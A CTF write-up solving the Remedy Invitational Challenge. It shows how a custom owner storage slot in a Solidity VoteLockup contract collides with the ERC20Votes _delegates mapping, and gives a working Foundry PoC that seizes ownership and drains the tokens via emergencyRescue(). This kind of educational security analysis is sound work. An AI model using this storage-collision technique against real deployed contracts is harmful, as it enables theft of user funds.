## The promised debrief of the [Remedy Invitational Challenge](https://github.com/Hexens/remedy-invitational-challenge)

As you can see, we have a classic Foundry repo with a smart contract system where the contract to hack is `VoteLockup`.
The condition of a successful hack and the setup phase are described in `Challenge`:
- `VoteLockup` contains 100 ERC20 `Token`
- You'll get only 1 `Token`
- To win, you have to drain these 100 `Token` from `VoteLockup` (your balance have to be 101 `Token`, and the balance of `VoteLockup` have to be 0)

Let's see what the functionality of `VoteLockup` is. It contains only a number of functions that you expect to find in a lockup contract: `lock()`, `unlock()`, `transferLock()`, several setter functions for the administration, and `emergencyRescue()`, which will withdraw the `Token` balance to the owner of the contract. These owner functions are quite useless at this point because the owner has been renounced at the setup phase in `Challenge` and is equal to `address(0)`.

Another interesting detail is that `VoteLockup` inherit from the standard OZ's [`ERC20Votes`](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20Votes) and another contract in the system, `Config`.

The first one is ERC20 with Votes extension, which allows you to mint tokens and keep a record of the holder's voting power.
The second contract is used to manage the storage variables. It contains several storage slot hashes.

And now we're going to rumble. Several factors allow us to perform an exploit of this system:
1. `VoteLockup` uses a custom ownership system. The storage slot that contains the owner's address is:
```solidity
    // (uint128(3), "VoteLockup.owner", uint256(9))
    bytes32 constant OWNER_SLOT = 0x1c74dc1e791d52b055e12f7becf77d0eadb955c09f51ff245f7130b2a5096380;
```
2. `transferLock()` in `VoteLockup` is malleable. It transfers the delegation of the recipient (address `to`) to the delegate of `msg.sender`, which allows you to write to the `_delegates` mapping in `ERC20Votes`:
```solidity
        _delegate(to, delegates(msg.sender));
```
3. This `_delegates` mapping is on the 9th storage slot (check it with `forge inspect ./src/VoteLockup.sol:VoteLockup storage-layout --pretty`):

| Name                             | Type                                               | Slot | Offset | Bytes | Contract                      |
| -------------------------------- | -------------------------------------------------- | ---- | ------ | ----- | ----------------------------- |
| _balances                        | mapping(address => uint256)                        | 0    | 0      | 32    | src/VoteLockup.sol:VoteLockup |
| _allowances                      | mapping(address => mapping(address => uint256))    | 1    | 0      | 32    | src/VoteLockup.sol:VoteLockup |
| _totalSupply                     | uint256                                            | 2    | 0      | 32    | src/VoteLockup.sol:VoteLockup |
| _name                            | string                                             | 3    | 0      | 32    | src/VoteLockup.sol:VoteLockup |
| _symbol                          | string                                             | 4    | 0      | 32    | src/VoteLockup.sol:VoteLockup |
| _nameFallback                    | string                                             | 5    | 0      | 32    | src/VoteLockup.sol:VoteLockup |
| _versionFallback                 | string                                             | 6    | 0      | 32    | src/VoteLockup.sol:VoteLockup |
| _nonces                          | mapping(address => struct Counters.Counter)        | 7    | 0      | 32    | src/VoteLockup.sol:VoteLockup |
| _PERMIT_TYPEHASH_DEPRECATED_SLOT | bytes32                                            | 8    | 0      | 32    | src/VoteLockup.sol:VoteLockup |
| _delegates                       | mapping(address => address)                        | 9    | 0      | 32    | src/VoteLockup.sol:VoteLockup |
| _checkpoints                     | mapping(address => struct ERC20Votes.Checkpoint[]) | 10   | 0      | 32    | src/VoteLockup.sol:VoteLockup |
| _totalSupplyCheckpoints          | struct ERC20Votes.Checkpoint[]                     | 11   | 0      | 32    | src/VoteLockup.sol:VoteLockup |
| lockCounter                      | uint256                                            | 12   | 0      | 32    | src/VoteLockup.sol:VoteLockup |
| locks                            | mapping(uint256 => struct VoteLockup.Lock)         | 13   | 0      | 32    | src/VoteLockup.sol:VoteLockup |

4. And if you're paying attention and you know something about how to calculate storage slots for mappings (I had to remind myself, honestly), you'll notice the 9 in the comment to `OWNER_SLOT`. This is a storage collision, anon!

Simply, the formula of a mapping storage slot is as follows: `keccak256(abi.encode(KEY, SLOT_INDEX_DECLARATION))`. `KEY` here is an arbitrary value, such as some address, because `_delegates` is a mapping from address to address. And `SLOT_INDEX_DECLARATION` is our storage slot, 9, in this particular case. Compare it to the `OWNER_SLOT` preimage: `(uint128(3), "VoteLockup.owner", uint256(9))`.

Encode `uint128(3), "VoteLockup.owner"` as address (`0x00000003566f74654c6F636B75702e6F776e6572`) to use it as `KEY`. Then compute `keccak256(abi.encode(0x00000003566f74654c6F636B75702e6F776e6572, 9))` and you'll see it is equal to `OWNER_SLOT`.

Read more about mappings in [this article](https://medium.com/@flores.eugenio03/exploring-the-storage-layout-in-solidity-and-how-to-access-state-variables-bf2cbc6f8018).

To use the exploit, I wrote this PoC:
```solidity
contract Solve is Test {
    function testSolve() public {
        Challenge challenge = new Challenge();

        Token token = challenge.token();
        VoteLockup voteLockup = challenge.voteLockup();

        token.approve(address(voteLockup), 1 ether);
        voteLockup.lock(1 ether, 7 days);

        voteLockup.delegate(address(this));
        voteLockup.transferLock(2, address(0x00000003566f74654c6F636B75702e6F776e6572));

        voteLockup.emergencyRescue();

        assert(challenge.isSolved());
    }
}
```

Step-by-step:
1. Prerequisites. Deploy `Challenge`, get `Token` and `VoteLockup` addresses.
2. Approve 1 `Token` and lock it for the minimal duration. The amount or duration doesn't matter, actually. The point is to get some of the `ERC20Votes` tokens from `VoteLockup`. This will allow us to use `transferLock()`.
3. Delegate to ourselves so `delegates(msg.sender)` will return our address.
4. Call `transferLock()`. Here is where all the magic happens: it'll execute `_delegate(0x00000003566f74654c6F636B75702e6F776e6572, our address)`, which basically means `_delegates[0x00000003566f74654c6F636B75702e6F776e6572] = our address`. And since the storage slot of `_delegates[0x00000003566f74654c6F636B75702e6F776e6572]` is equal to `OWNER_SLOT`, we set the ownership to our address!
5. Then we can execute `emergencyRescue()` and get the money. Profit!

It took me one hour to find all the pieces of the puzzle; I hope you enjoyed it too!
Thanks to 0xKasper and Remedy for this wonderful experience!